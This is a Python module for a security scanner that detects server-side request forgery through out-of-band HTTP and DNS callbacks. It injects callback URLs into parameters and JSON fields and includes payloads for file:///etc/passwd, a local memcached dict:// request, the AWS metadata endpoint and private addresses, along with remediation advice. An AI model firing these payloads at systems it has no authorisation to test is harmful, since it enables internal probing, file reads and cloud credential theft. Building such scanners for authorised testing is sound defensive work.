# -*- coding: utf-8 -*-
from typing import Dict, Any, List
from urllib.parse import urljoin, urlencode, urlparse
import time
import uuid
from ..base.feature_base import FeatureBase
from ..base.feature_registry import FeatureRegistry
from ..base.result_schema import FeatureResult, Finding
from ..base.http_client import SafeHttp

@FeatureRegistry.register
class SsrfOobWorker(FeatureBase):
    """
    SSRF (Server-Side Request Forgery) with OOB 檢測模組
    
    專門檢測服務端請求偽造漏洞，特別是透過 Out-of-Band (OOB) 技術
    來證明 SSRF 的存在。這類漏洞在實戰中非常有價值，因為：
    
    1. 可以證明服務端確實發出了外部請求
    2. 能夠探測內網服務和敏感端點
    3. 可能導致資料外洩或內網滲透
    4. 在 PDF 生成、URL 預覽、圖片抓取等功能中常見
    
    檢測方法：
    - HTTP OOB：讓目標服務請求攻擊者控制的 HTTP 端點
    - DNS OOB：透過 DNS 查詢來證明 SSRF
    - 多種注入點：URL 參數、JSON 欄位、HTTP 頭等
    - 協議測試：HTTP/HTTPS/file/dict/gopher 等
    """
    
    name = "ssrf_oob"
    version = "2.0.0"
    tags = ["ssrf", "oob", "server-side-request-forgery", "exfiltration"]

    def run(self, params: Dict[str, Any]) -> FeatureResult:
        """
        執行 SSRF OOB 檢測
        
        Args:
            params: 檢測參數
              - target (str): 基礎 URL
              - probe_endpoints (list): 可能存在 SSRF 的端點列表
              - url_params (list): URL 參數名稱，如 ["url", "link", "fetch"]
              - json_fields (list): JSON 欄位名稱，如 ["imageUrl", "webhookUrl"]
              - headers (dict): 認證頭
              - oob_http (str): OOB HTTP 回調 URL
              - oob_dns (str): OOB DNS 域名
              - test_protocols (list): 測試的協議，如 ["http", "https", "file"]
              - payload_types (list): payload 類型，如 ["direct", "encoded", "nested"]
              - options (dict): 其他選項
                - delay_seconds: 等待 OOB 回調的時間
                - auto_discover: 是否自動發現常見端點
                - test_internal: 是否測試內網地址
              
        Returns:
            FeatureResult: 檢測結果
        """
        http = SafeHttp()
        base = params.get("target", "")
        probe_endpoints = params.get("probe_endpoints", [])
        url_params = params.get("url_params", ["url", "link", "fetch", "src", "href"])
        json_fields = params.get("json_fields", ["url", "imageUrl", "webhookUrl", "callbackUrl"])
        headers = params.get("headers", {})
        oob_http = params.get("oob_http", "")
        oob_dns = params.get("oob_dns", "")
        test_protocols = params.get("test_protocols", ["http", "https"])
        payload_types = params.get("payload_types", ["direct", "encoded"])
        options = params.get("options", {})
        
        delay_seconds = options.get("delay_seconds", 5)
        auto_discover = options.get("auto_discover", True)
        test_internal = options.get("test_internal", False)
        
        findings: List[Finding] = []
        trace = []
        
        # 生成唯一的測試 token 用於追蹤
        test_token = str(uuid.uuid4())[:8]
        
        cmd = self.build_command_record(
            "ssrf.oob",
            f"SSRF OOB 檢測，測試 token: {test_token}",
            {
                "endpoints_count": len(probe_endpoints),
                "oob_methods": [method for method in ["http", "dns"] if 
                              (method == "http" and oob_http) or (method == "dns" and oob_dns)],
                "test_token": test_token
            }
        )
        
        # 自動發現常見的 SSRF 端點
        if auto_discover:
            common_endpoints = [
                "/fetch", "/proxy", "/download", "/preview", "/thumbnail",
                "/pdf/generate", "/export/pdf", "/render", "/convert",
                "/webhook", "/callback", "/notify", "/ping",
                "/api/fetch", "/api/proxy", "/api/download", "/api/preview",
                "/admin/fetch", "/admin/proxy", "/tools/fetch"
            ]
            probe_endpoints.extend(common_endpoints)
        
        # 去重
        probe_endpoints = list(set(probe_endpoints))
        
        if not oob_http and not oob_dns:
            return FeatureResult(
                False, self.name, cmd, [],
                {"error": "缺少 OOB 回調設定（oob_http 或 oob_dns）", "trace": trace}
            )
        
        # 準備測試 payload
        test_payloads = self._generate_payloads(
            oob_http, oob_dns, test_token, test_protocols, payload_types, test_internal
        )
        
        # 對每個端點進行測試
        for endpoint in probe_endpoints:
            full_url = urljoin(base, endpoint)
            
            # 測試 URL 參數注入
            for param_name in url_params:
                for payload in test_payloads:
                    try:
                        # GET 請求測試
                        query_params = {param_name: payload["url"]}
                        test_url = f"{full_url}?{urlencode(query_params)}"
                        
                        response = http.request("GET", test_url, headers=headers)
                        
                        trace.append({
                            "step": "url_param_test",
                            "endpoint": endpoint,
                            "param": param_name,
                            "payload_type": payload["type"],
                            "status": response.status_code,
                            "token": test_token
                        })
                        
                        # 如果返回成功，可能存在 SSRF
                        if 200 <= response.status_code < 300:
                            self._record_potential_ssrf(
                                findings, "URL Parameter", endpoint, param_name, 
                                payload, test_token, test_url
                            )
                            
                    except Exception as e:
                        trace.append({
                            "step": "url_param_error",
                            "endpoint": endpoint,
                            "param": param_name,
                            "error": str(e)
                        })
            
            # 測試 JSON 欄位注入
            for field_name in json_fields:
                for payload in test_payloads:
                    try:
                        # POST JSON 請求測試
                        json_data = {field_name: payload["url"]}
                        
                        response = http.request(
                            "POST", full_url,
                            headers={**headers, "Content-Type": "application/json"},
                            json=json_data
                        )
                        
                        trace.append({
                            "step": "json_field_test",
                            "endpoint": endpoint,
                            "field": field_name,
                            "payload_type": payload["type"],
                            "status": response.status_code,
                            "token": test_token
                        })
                        
                        if 200 <= response.status_code < 300:
                            self._record_potential_ssrf(
                                findings, "JSON Field", endpoint, field_name,
                                payload, test_token, full_url, json_data
                            )
                            
                    except Exception as e:
                        trace.append({
                            "step": "json_field_error",
                            "endpoint": endpoint,
                            "field": field_name,
                            "error": str(e)
                        })
        
        # 等待 OOB 回調
        if findings:
            trace.append({
                "step": "waiting_for_oob",
                "delay_seconds": delay_seconds,
                "token": test_token,
                "message": f"等待 {delay_seconds} 秒以接收 OOB 回調"
            })
            time.sleep(delay_seconds)
        
        return FeatureResult(
            ok=bool(findings),
            feature=self.name,
            command_record=cmd,
            findings=findings,
            meta={
                "trace": trace,
                "test_token": test_token,
                "endpoints_tested": len(probe_endpoints),
                "payloads_tested": len(test_payloads),
                "oob_verification_note": f"請在 OOB 平台檢查 token {test_token} 的回調記錄"
            }
        )
    
    def _generate_payloads(self, oob_http: str, oob_dns: str, token: str, 
                          protocols: List[str], payload_types: List[str], 
                          test_internal: bool) -> List[Dict[str, Any]]:
        """生成測試 payload"""
        payloads = []
        
        # HTTP OOB payloads
        if oob_http:
            for protocol in protocols:
                if protocol in ["http", "https"]:
                    base_url = oob_http.replace("https://", f"{protocol}://").replace("http://", f"{protocol}://")
                    
                    # 直接 payload
                    if "direct" in payload_types:
                        payloads.append({
                            "type": f"direct_{protocol}",
                            "url": f"{base_url}?token={token}&type=direct"
                        })
                    
                    # URL 編碼 payload
                    if "encoded" in payload_types:
                        encoded_url = f"{base_url}?token={token}&type=encoded".replace(":", "%3A").replace("?", "%3F").replace("&", "%26")
                        payloads.append({
                            "type": f"encoded_{protocol}",
                            "url": encoded_url
                        })
                
                # 危險協議測試（僅在明確允許時）
                elif protocol in ["file", "dict", "gopher"] and test_internal:
                    if protocol == "file":
                        payloads.append({
                            "type": "file_protocol",
                            "url": "file:///etc/passwd"
                        })
                    elif protocol == "dict":
                        payloads.append({
                            "type": "dict_protocol", 
                            "url": "dict://127.0.0.1:11211/stats"
                        })
        
        # DNS OOB payloads
        if oob_dns:
            if "direct" in payload_types:
                payloads.append({
                    "type": "dns_direct",
                    "url": f"http://{token}.{oob_dns}/test"
                })
            
            if "encoded" in payload_types:
                payloads.append({
                    "type": "dns_encoded",
                    "url": f"http://{token}.{oob_dns}/test".replace(".", "%2E")
                })
        
        # 內網探測 payloads（僅在允許時）
        if test_internal:
            internal_targets = [
                "http://169.254.169.254/latest/meta-data/",  # AWS metadata
                "http://127.0.0.1:8080/",
                "http://localhost:3000/",
                "http://10.0.0.1/",
                "http://192.168.1.1/"
            ]
            for target in internal_targets:
                payloads.append({
                    "type": "internal_probe",
                    "url": target
                })
        
        return payloads
    
    def _record_potential_ssrf(self, findings: List[Finding], injection_type: str, 
                              endpoint: str, param_name: str, payload: Dict[str, Any], 
                              token: str, request_info: str, json_data: Dict = None):
        """記錄潛在的 SSRF 漏洞"""
        
        severity = "medium"
        if payload["type"].startswith("internal"):
            severity = "high"
        elif payload["type"] in ["dns_direct", "dns_encoded"]:
            severity = "high"
        elif "file" in payload["type"] or "dict" in payload["type"]:
            severity = "critical"
        
        evidence = {
            "injection_point": f"{injection_type}: {param_name}",
            "endpoint": endpoint,
            "payload_url": payload["url"],
            "payload_type": payload["type"],
            "verification_token": token,
            "request_info": request_info
        }
        
        if json_data:
            evidence["json_payload"] = json_data
        
        reproduction_steps = [
            {
                "step": 1,
                "description": f"向 {endpoint} 發送包含外部 URL 的請求",
                "request": {
                    "method": "POST" if json_data else "GET",
                    "url": request_info if not json_data else endpoint,
                    "json": json_data if json_data else None
                },
                "expect": "服務器不應向外部 URL 發送請求"
            },
            {
                "step": 2,
                "description": f"檢查 OOB 平台是否收到 token {token} 的回調",
                "expect": "如果收到回調，確認存在 SSRF 漏洞"
            }
        ]
        
        impact_desc = "服務端可被誘導向攻擊者控制的 URL 發送請求"
        if payload["type"].startswith("internal"):
            impact_desc += "，可能導致內網探測和敏感資料洩漏"
        elif "file" in payload["type"]:
            impact_desc += "，可能導致本地檔案讀取"
        
        recommendation = (
            "1. 實施 URL 白名單，僅允許特定域名\n"
            "2. 禁用危險協議（file、dict、gopher 等）\n"
            "3. 過濾私有 IP 地址範圍\n"
            "4. 設置請求超時和大小限制\n"
            "5. 使用專用的代理服務進行外部請求"
        )
        
        findings.append(Finding(
            vuln_type=f"SSRF via {injection_type}",
            severity=severity,
            title=f"SSRF 漏洞於 {endpoint} ({injection_type}: {param_name})",
            evidence=evidence,
            reproduction=reproduction_steps,
            impact=impact_desc,
            recommendation=recommendation
        ))